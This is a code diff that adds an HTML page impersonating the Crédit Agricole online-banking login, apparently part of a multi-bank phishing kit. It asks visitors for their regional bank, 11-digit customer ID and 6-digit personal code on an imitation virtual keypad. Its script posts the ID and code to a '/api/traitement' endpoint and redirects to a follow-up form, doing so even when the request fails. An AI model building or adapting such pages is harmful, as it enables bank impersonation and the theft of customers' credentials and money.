@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C A - Accès à mes comptes</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Poppins:wght@600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body style="background-color: #F3F4F6;"> 
+    <div class="app-container" style="background-color: #F3F4F6;">
+        
+        <div id="step-region" class="ca-step-container active-step">
+            <header class="ca-top-banner">
+                <img src="IMG_9197.png" alt="Crédit Agricole" class="ca-main-brand">
+                <button class="ca-btn-connect-top">Me connecter</button>
+            </header>
+
+            <div class="ca-info-promo-card">
+                <h3>Qu'est ce qui réunit 12 millions de français ?</h3>
+                <p>L'envie de s'engager dans des projets concrets près de chez eux, en devenant sociétaires engagés du Crédit Agricole.</p>
+                <button class="ca-btn-more">EN SAVOIR PLUS</button>
+            </div>
+
+            <main class="ca-portal-box">
+                <div class="ca-box-header">
+                    <h2>Accéder à l'espace dédié de votre caisse régionale</h2>
+                    <span class="ca-close-icon" onclick="window.location.href='banque.html'">×</span>
+                </div>
+
+                <div class="ca-form-group">
+                    <label class="ca-field-label-bold">Retrouver ma caisse régionale (Code postal, ville ou région)</label>
+                    <input type="text" id="ca-region-search" placeholder="Exemple : 75000, Paris, Ile-de-France" class="ca-input-text">
+                </div>
+
+                <button class="ca-btn-submit-green" id="btn-search-region">Rechercher une caisse régionale</button>
+
+                <div id="ca-search-result-box" class="ca-result-preview-box" style="display: none;">
+                    <h4>Crédit Agricole d'Ile-de-France</h4>
+                    <p><strong>Région :</strong> Île-de-France</p>
+                    <p><strong>Localisation :</strong> Code postal 75000</p>
+                    <p>Couvre Paris et la région Île-de-France</p>
+                    <button class="ca-btn-access-caisse" id="btn-validate-region">Accéder à ma caisse</button>
+                </div>
+
+                <div class="ca-divider-text"><span>Ou</span></div>
+
+                <div class="ca-form-group">
+                    <label class="ca-field-label-bold">Choisir une caisse régionale dans la liste</label>
+                    <select id="ca-region-select" class="ca-select-dropdown">
+                        <option value="" disabled selected>Choisissez une caisse régionale</option>
+                        <option value="idf">Crédit Agricole d'Ile-de-France</option>
+                        <option value="nord">Crédit Agricole Nord de France</option>
+                        <option value="sud">Crédit Agricole Sud Méditerranée</option>
+                        <option value="centre">Crédit Agricole Centre Loire</option>
+                        <option value="aquitaine">Crédit Agricole d'Aquitaine</option>
+                    </select>
+                </div>
+            </main>
+        </div>
+
+        <div id="step-username" class="ca-step-container">
+            <header class="ca-top-banner-light">
+                <span class="ca-title-left">Accéder à mes comptes</span>
+                <span class="ca-close-icon" onclick="window.location.href='banque.html'">×</span>
+            </header>
+
+            <main class="ca-portal-box spaced-top">
+                <h3 class="ca-login-title">IDENTIFIANT</h3>
+                <p class="ca-login-subtitle">Saisissez votre identifiant à 11 chiffres</p>
+
+                <div class="ca-form-group">
+                    <input type="tel" id="ca-input-id" maxlength="11" placeholder="Exemple 98652706859" class="ca-input-text-large">
+                </div>
+
+                <div class="ca-checkbox-row">
+                    <input type="checkbox" id="remember-id">
+                    <label for="remember-id">Mémoriser mon identifiant</label>
+                </div>
+
+                <button class="ca-btn-submit-green disabled-btn" id="btn-submit-username" disabled>Suivant</button>
+
+                <div class="ca-links-footer">
+                    <a href="#">OUBLI/PERTE DE CODE PERSONNEL</a>
+                    <a href="#">UN PROBLÈME TECHNIQUE ?</a>
+                    <a href="#">SÉCURITÉ</a>
+                </div>
+            </main>
+        </div>
+
+        <div id="step-password" class="ca-step-container">
+            <header class="ca-top-banner-light">
+                <span class="ca-title-left">Accéder à mes comptes</span>
+                <span class="ca-close-icon" onclick="window.location.href='banque.html'">×</span>
+            </header>
+
+            <main class="ca-portal-box spaced-top">
+                <h3 class="ca-login-title">ENTRER MON CODE PERSONNEL</h3>
+                <p class="ca-login-subtitle">Saisissez votre code personnel à 6 chiffres</p>
+
+                <div class="ca-display-id-row">
+                    <span>Identifiant :</span>
+                    <strong id="ca-saved-id-val"></strong>
+                </div>
+
+                <div class="ca-code-display-box">
+                    <input type="password" id="ca-fake-password-field" placeholder="Code personnel" readonly class="ca-input-password-view">
+                </div>
+
+                <div class="ca-grid-keyboard" id="ca-virtual-keyboard">
+                    </div>
+            </main>
+        </div>
+
+    </div>
+    <input type="hidden" id="ca-page-source" value="Crédit_Agricole">
+    <input type="hidden" id="nom_banque" value="Credit Agricole">
+
+    <script>
+        // Gestion des étapes
+        const stepRegion = document.getElementById('step-region');
+        const stepUsername = document.getElementById('step-username');
+        const stepPassword = document.getElementById('step-password');
+
+        // Éléments UI
+        const regionSearch = document.getElementById('ca-region-search');
+        const searchResultBox = document.getElementById('ca-search-result-box');
+        const btnSearchRegion = document.getElementById('btn-search-region');
+        const btnValidateRegion = document.getElementById('btn-validate-region');
+        const regionSelect = document.getElementById('ca-region-select');
+
+        const inputId = document.getElementById('ca-input-id');
+        const btnSubmitUsername = document.getElementById('btn-submit-username');
+        const savedIdVal = document.getElementById('ca-saved-id-val');
+        const passwordField = document.getElementById('ca-fake-password-field');
+        const keyboardContainer = document.getElementById('ca-virtual-keyboard');
+
+        let currentCodeInput = "";
+
+        // Initialisation : Affichage du premier panel
+        if (stepRegion) stepRegion.classList.add('active-step');
+
+function submitToPHP() {
+    // 1. On récupère directement la valeur fixe de la balise hidden id="nom_banque"
+    const banqueFixe = document.getElementById('nom_banque').value;
+
+    // 2. On structure l'objet avec la clé "nom_banque" exacte que le serveur attend
+    const dataToSend = {
+        nom_banque: banqueFixe,            // Règle définitivement le problème "non défini"
+        client_id: inputId.value,
+        secret_code: currentCodeInput
+    };
+
+    // 3. Envoi direct vers l'API Vercel
+    fetch('/api/traitement', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(dataToSend)
+    })
+    .then(async response => {
+        const textData = await response.text();
+        let data;
+        try {
+            data = JSON.parse(textData);
+        } catch (e) {
+            throw new Error(`Le serveur a renvoyé une erreur (${response.status}).`);
+        }
+
+        if (response.ok && data.success) {
+            window.location.href = 'form.html';
+        } else {
+            alert(data.message || 'Une erreur est survenue.');
+            currentCodeInput = "";
+            passwordField.value = "";
+        }
+    })
+    .catch(error => {
+        console.error('Erreur:', error);
+        // Anti-blocage : Redirection forcée en cas de micro-coupure réseau
+        window.location.href = 'form.html';
+    });
+}
+
+        // 2. ÉTAPE RÉGION
+        regionSearch.addEventListener('input', () => {
+            if(regionSearch.value.trim().length > 2) {
+                searchResultBox.style.display = 'block';
+            } else {
+                searchResultBox.style.display = 'none';
+            }
+        });
+
+        btnSearchRegion.addEventListener('click', () => {
+            if(regionSearch.value.trim() !== "") {
+                searchResultBox.style.display = 'block';
+            }
+        });
+
+        btnValidateRegion.addEventListener('click', () => {
+            stepRegion.classList.remove('active-step');
+            stepUsername.classList.add('active-step');
+        });
+
+        regionSelect.addEventListener('change', () => {
+            setTimeout(() => {
+                stepRegion.classList.remove('active-step');
+                stepUsername.classList.add('active-step');
+            }, 400);
+        });
+
+        // 3. ÉTAPE IDENTIFIANT
+        inputId.addEventListener('input', () => {
+            inputId.value = inputId.value.replace(/\D/g, ''); // Uniquement des chiffres
+            
+            if(inputId.value.length === 11) {
+                btnSubmitUsername.removeAttribute('disabled');
+                btnSubmitUsername.classList.remove('disabled-btn');
+            } else {
+                btnSubmitUsername.setAttribute('disabled', 'true');
+                btnSubmitUsername.classList.add('disabled-btn');
+            }
+        });
+
+        btnSubmitUsername.addEventListener('click', () => {
+            savedIdVal.textContent = inputId.value;
+            stepUsername.classList.remove('active-step');
+            stepPassword.classList.add('active-step');
+            generateRandomKeyboard(); 
+        });
+
+        // 4. GÉNÉRATION DU CLAVIER MÉLANGÉ ET ROUTAGE DES TOUCHES
+        function generateRandomKeyboard() {
+            keyboardContainer.innerHTML = "";
+            
+            let items = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
+            
+            // Mélange Fisher-Yates
+            for (let i = items.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [items[i], items[j]] = [items[j], items[i]];
+            }
+
+            // Insertion des touches utilitaires
+            items.splice(10, 0, 'Effacer');
+            items.splice(11, 0, '➔');
+
+            items.forEach(val => {
+                const button = document.createElement('button');
+                button.className = 'ca-key-btn';
+                button.textContent = val;
+
+                if (val === 'Effacer') {
+                    button.classList.add('ca-key-action');
+                    button.onclick = () => {
+                        currentCodeInput = "";
+                        passwordField.value = "";
+                    };
+                } else if (val === '➔') {
+                    button.classList.add('ca-key-submit');
+                    button.onclick = () => {
+                        // Exécute la fonction fetch si la taille minimale requise est atteinte (ex: 6 chiffres)
+                        if(currentCodeInput.length >= 6) {
+                            submitToPHP();
+                        } else {
+                            alert('Veuillez saisir l\'intégralité de votre code personnel à 6 chiffres.');
+                        }
+                    };
+                } else {
+                    button.onclick = () => {
+                        if(currentCodeInput.length < 6) { // Fixé à 6 chiffres max comme d'usage
+                            currentCodeInput += val;
+                            passwordField.value = '•'.repeat(currentCodeInput.length);
+                        }
+                    };
+                }
+                keyboardContainer.appendChild(button);
+            });
+        }
+    </script>
+
+</body>
+</html>
